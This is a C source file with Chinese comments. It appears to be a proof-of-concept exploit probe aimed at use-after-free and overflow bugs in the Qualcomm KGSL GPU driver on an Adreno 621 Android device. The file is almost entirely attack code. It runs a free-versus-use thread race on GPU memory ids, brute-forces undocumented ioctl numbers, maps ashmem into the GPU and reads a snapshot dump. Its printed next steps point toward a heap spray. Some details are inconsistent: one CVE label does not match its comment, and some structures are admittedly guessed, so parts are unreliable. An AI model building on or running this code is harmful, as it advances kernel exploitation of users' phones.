/*
 * kgsl_uaf_poc.c - KGSL UAF 漏洞探測 PoC
 *
 * 目標 CVE:
 * - CVE-2023-33063: KGSL Use-After-Free
 * - CVE-2023-33107: KGSL Integer Overflow leading to UAF
 * - CVE-2024-23380: KGSL OOB Write
 *
 * 設備資訊:
 * - GPU: Adreno 621v1
 * - /dev/kgsl-3d0 O_RDWR 可用
 *
 * 編譯:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_uaf_poc kgsl_uaf_poc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <pthread.h>

/* KGSL Magic */
#define KGSL_IOC_TYPE 0x09

/* 標準的 KGSL ioctl 定義 */
#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_GPUMEM_ALLOC _IOWR(KGSL_IOC_TYPE, 0x22, struct kgsl_gpumem_alloc)
#define IOCTL_KGSL_GPUMEM_FREE _IOW(KGSL_IOC_TYPE, 0x23, struct kgsl_gpumem_free)
#define IOCTL_KGSL_GPUMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x3d, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_FREE_ID _IOW(KGSL_IOC_TYPE, 0x3e, unsigned int)
#define IOCTL_KGSL_GPUMEM_GET_INFO _IOWR(KGSL_IOC_TYPE, 0x3f, struct kgsl_gpumem_get_info)
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x51, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x52, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x5a, struct kgsl_gpu_command)
#define IOCTL_KGSL_TIMELINE_CREATE _IOWR(KGSL_IOC_TYPE, 0x70, struct kgsl_timeline_create)
#define IOCTL_KGSL_TIMELINE_WAIT _IOWR(KGSL_IOC_TYPE, 0x71, struct kgsl_timeline_wait)
#define IOCTL_KGSL_TIMELINE_DESTROY _IOW(KGSL_IOC_TYPE, 0x74, unsigned int)

/* KGSL Properties */
#define KGSL_PROP_DEVICE_INFO 0
#define KGSL_PROP_DEVICE_SHADOW 1
#define KGSL_PROP_DEVICE_VERSION 2
#define KGSL_PROP_GPU_MODEL 3
#define KGSL_PROP_VERSION 4
#define KGSL_PROP_GPUHTW_MEMTYPE 5
#define KGSL_PROP_HIGHEST_BANK_BIT 6

/* KGSL Flags */
#define KGSL_MEMFLAGS_GPUREADONLY 0x1
#define KGSL_MEMFLAGS_GPUWRITEONLY 0x2
#define KGSL_MEMFLAGS_USERMEM_ADDR 0x80000
#define KGSL_MEMFLAGS_USERMEM_ION 0x100000
#define KGSL_MEMFLAGS_USERMEM_ASHMEM 0x180000

/* 結構定義 */
struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

struct kgsl_gpumem_alloc
{
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};

struct kgsl_gpumem_free
{
    unsigned long gpuaddr;
};

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    unsigned long gpuaddr;
};

struct kgsl_gpumem_get_info
{
    unsigned int id;
    unsigned long gpuaddr;
    size_t size;
    size_t mmapsize;
    unsigned int useraddr;
};

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_base;
    uint64_t va_len;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
    uint64_t padding;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    unsigned int id;
    unsigned int padding;
};

struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

struct kgsl_gpu_command
{
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
};

struct kgsl_timeline_create
{
    unsigned int flags;
    unsigned int count;
    unsigned int id;
    unsigned int padding;
};

struct kgsl_timeline_wait
{
    uint64_t timelines;
    unsigned int count;
    unsigned int timeout_ms;
    unsigned int flags;
    unsigned int padding;
};

/* 全局變量 */
int g_kgsl_fd = -1;
unsigned int g_context_id = 0;
volatile int g_race_flag = 0;

/* 創建 drawing context */
int create_context(void)
{
    struct kgsl_drawctxt_create ctx = {0};
    ctx.flags = 0;

    int ret = ioctl(g_kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx);
    if (ret == 0)
    {
        printf("[+] Context created: id=%u\n", ctx.drawctxt_id);
        return ctx.drawctxt_id;
    }
    printf("[-] Context creation failed: %s\n", strerror(errno));
    return -1;
}

/* 銷毀 context */
void destroy_context(unsigned int id)
{
    struct kgsl_drawctxt_destroy ctx = {.drawctxt_id = id};
    ioctl(g_kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &ctx);
}

/* 嘗試分配 GPU 記憶體 - 使用不同方法 */
void test_gpumem_allocation(void)
{
    printf("\n=== Testing GPU Memory Allocation ===\n");

    /* 方法 1: GPUMEM_ALLOC */
    struct kgsl_gpumem_alloc alloc1 = {0};
    alloc1.size = 0x1000;
    alloc1.flags = 0;

    int ret = ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc1);
    printf("[*] GPUMEM_ALLOC: ret=%d, errno=%d, gpuaddr=0x%lx\n",
           ret, errno, alloc1.gpuaddr);

    /* 方法 2: GPUMEM_ALLOC_ID */
    struct kgsl_gpumem_alloc_id alloc2 = {0};
    alloc2.size = 0x1000;
    alloc2.flags = 0;

    ret = ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc2);
    printf("[*] GPUMEM_ALLOC_ID: ret=%d, errno=%d, id=%u, gpuaddr=0x%lx\n",
           ret, errno, alloc2.id, alloc2.gpuaddr);

    /* 方法 3: GPUOBJ_ALLOC (新 API) */
    struct kgsl_gpuobj_alloc alloc3 = {0};
    alloc3.size = 0x1000;
    alloc3.flags = 0;

    ret = ioctl(g_kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc3);
    printf("[*] GPUOBJ_ALLOC: ret=%d, errno=%d, id=%u\n",
           ret, errno, alloc3.id);

    /* 方法 4: 使用 ashmem + MAP_USER_MEM */
    int ashmem_fd = open("/dev/ashmem", O_RDWR);
    if (ashmem_fd >= 0)
    {
        printf("[+] Opened /dev/ashmem: fd=%d\n", ashmem_fd);

        // 設置 ashmem 名稱和大小
        ioctl(ashmem_fd, 0x41007701, "kgsl_test"); // ASHMEM_SET_NAME
        ioctl(ashmem_fd, 0x40087703, 0x10000);     // ASHMEM_SET_SIZE

        // mmap ashmem
        void *ashmem_ptr = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                                MAP_SHARED, ashmem_fd, 0);
        if (ashmem_ptr != MAP_FAILED)
        {
            printf("[+] Mapped ashmem at %p\n", ashmem_ptr);

            // 嘗試註冊到 KGSL
            struct
            {
                unsigned long gpuaddr;
                unsigned long hostptr;
                size_t size;
                unsigned int flags;
                unsigned int reserved;
            } map_user = {0};

            map_user.hostptr = (unsigned long)ashmem_ptr;
            map_user.size = 0x10000;
            map_user.flags = KGSL_MEMFLAGS_USERMEM_ASHMEM;

            ret = ioctl(g_kgsl_fd, 0xc0280915, &map_user); // MAP_USER_MEM
            printf("[*] MAP_USER_MEM (ashmem): ret=%d, errno=%d, gpuaddr=0x%lx\n",
                   ret, errno, map_user.gpuaddr);

            munmap(ashmem_ptr, 0x10000);
        }
        close(ashmem_fd);
    }
}

/* 嘗試 CVE-2023-33063 風格的 UAF */
void test_timeline_uaf(void)
{
    printf("\n=== Testing Timeline UAF (CVE-2024-43098 style) ===\n");

    struct kgsl_timeline_create create = {0};
    create.flags = 0;
    create.count = 1;

    int ret = ioctl(g_kgsl_fd, IOCTL_KGSL_TIMELINE_CREATE, &create);
    if (ret < 0)
    {
        printf("[-] Timeline create failed: %s\n", strerror(errno));
        return;
    }
    printf("[+] Timeline created: id=%u\n", create.id);

    // 嘗試 wait 操作
    struct kgsl_timeline_wait wait = {0};
    uint64_t timeline_data[2] = {create.id, 0};
    wait.timelines = (uint64_t)timeline_data;
    wait.count = 1;
    wait.timeout_ms = 1;

    ret = ioctl(g_kgsl_fd, IOCTL_KGSL_TIMELINE_WAIT, &wait);
    printf("[*] Timeline wait: ret=%d, errno=%d\n", ret, errno);

    // 銷毀 timeline
    ret = ioctl(g_kgsl_fd, IOCTL_KGSL_TIMELINE_DESTROY, &create.id);
    printf("[*] Timeline destroy: ret=%d\n", ret);
}

/* 嘗試觸發 race condition */
void *race_thread_free(void *arg)
{
    unsigned int *id = (unsigned int *)arg;

    while (!g_race_flag)
    {
        usleep(1);
    }

    // 快速釋放
    ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, id);
    return NULL;
}

void *race_thread_use(void *arg)
{
    unsigned int *id = (unsigned int *)arg;

    while (!g_race_flag)
    {
        usleep(1);
    }

    // 同時使用
    struct kgsl_gpumem_get_info info = {0};
    info.id = *id;
    ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_GET_INFO, &info);
    return NULL;
}

void test_race_condition(void)
{
    printf("\n=== Testing Race Condition ===\n");

    for (int i = 0; i < 10; i++)
    {
        // 分配記憶體
        struct kgsl_gpumem_alloc_id alloc = {0};
        alloc.size = 0x1000;
        alloc.flags = 0;

        if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) < 0)
        {
            continue;
        }

        g_race_flag = 0;

        pthread_t t1, t2;
        pthread_create(&t1, NULL, race_thread_free, &alloc.id);
        pthread_create(&t2, NULL, race_thread_use, &alloc.id);

        usleep(100);
        g_race_flag = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
    }

    printf("[*] Race condition test completed\n");
}

/* 掃描更多潛在的 ioctl */
void scan_advanced_ioctls(void)
{
    printf("\n=== Scanning Advanced IOCTLs ===\n");

    char buf[1024] = {0};

    // 重點掃描 0x50-0x60 範圍 (GPUOBJ 相關)
    unsigned int sizes[] = {16, 32, 48, 64, 80, 0};

    for (int s = 0; sizes[s] != 0; s++)
    {
        printf("\n[*] Size=%d bytes:\n", sizes[s]);

        for (int nr = 0x50; nr <= 0x60; nr++)
        {
            unsigned int cmd = 0xc0000000 | (sizes[s] << 16) | (0x09 << 8) | nr;

            memset(buf, 0, sizeof(buf));
            errno = 0;
            int ret = ioctl(g_kgsl_fd, cmd, buf);

            if (errno != 25 && errno != 22)
            {
                printf("  nr=0x%02x: ret=%d, errno=%d (%s)\n",
                       nr, ret, errno, strerror(errno));
            }
        }
    }
}

/* 嘗試讀取 GPU 快照 */
void try_read_gpu_snapshot(void)
{
    printf("\n=== Trying to Read GPU Snapshot ===\n");

    int fd = open("/sys/class/kgsl/kgsl-3d0/snapshot/dump", O_RDONLY);
    if (fd >= 0)
    {
        char buf[4096];
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n > 0)
        {
            printf("[+] Read %zd bytes from snapshot dump\n", n);
            printf("    First 32 bytes: ");
            for (int i = 0; i < 32 && i < n; i++)
            {
                printf("%02x ", (unsigned char)buf[i]);
            }
            printf("\n");
        }
        close(fd);
    }
    else
    {
        printf("[-] Cannot open snapshot dump: %s\n", strerror(errno));
    }
}

int main(int argc, char **argv)
{
    printf("=== KGSL UAF PoC ===\n");
    printf("Target: Adreno 621v1\n");
    printf("====================\n");

    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", g_kgsl_fd);

    // 創建 context
    g_context_id = create_context();

    // 測試 GPU 記憶體分配
    test_gpumem_allocation();

    // 測試 timeline UAF
    test_timeline_uaf();

    // 測試 race condition
    if (argc > 1 && strcmp(argv[1], "-r") == 0)
    {
        test_race_condition();
    }

    // 掃描高級 ioctl
    scan_advanced_ioctls();

    // 讀取 GPU 快照
    try_read_gpu_snapshot();

    // 清理
    if (g_context_id > 0)
    {
        destroy_context(g_context_id);
    }

    close(g_kgsl_fd);

    printf("\n=== Summary ===\n");
    printf("KGSL driver is accessible with full R/W permissions.\n");
    printf("Next steps:\n");
    printf("1. Find correct ioctl structure for GPU memory allocation\n");
    printf("2. Identify CVE-specific trigger conditions\n");
    printf("3. Develop heap spray using ashmem\n");

    return 0;
}
